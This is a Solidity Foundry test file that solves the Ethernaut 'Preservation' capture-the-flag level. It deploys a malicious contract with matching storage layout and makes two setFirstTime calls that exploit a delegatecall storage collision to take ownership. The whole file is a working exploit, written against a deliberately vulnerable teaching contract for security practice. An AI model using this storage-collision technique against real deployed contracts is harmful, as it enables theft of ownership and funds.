// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {SetUpLevelTest} from "../SetUpLevelTest.sol";
import {Preservation, PreservationFactory} from "ethernaut/levels/PreservationFactory.sol";

contract PreservationLevel is SetUpLevelTest {
    Preservation internal preservation;

    function setUp() public override {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        instanceBalance = 0 ether;
        playerBalance = 0 ether;
        level = address(new PreservationFactory());
        super.setUp();
        preservation = Preservation(instance);

        /** CODE YOUR SOLUTION HERE */
        vm.startPrank(player);
        address preAttack = address(new PreservationAttack());
        preservation.setFirstTime(uint256(uint160(preAttack))); // set timeZone1Library to our malicious contract
        preservation.setFirstTime(uint256(uint160(player)));
        vm.stopPrank();
    }
}

contract PreservationAttack {
    uint256[2] __gap;
    address owner;

    function setTime(uint256 _newOwner) public {
        owner = address(uint160(_newOwner));
    }
}
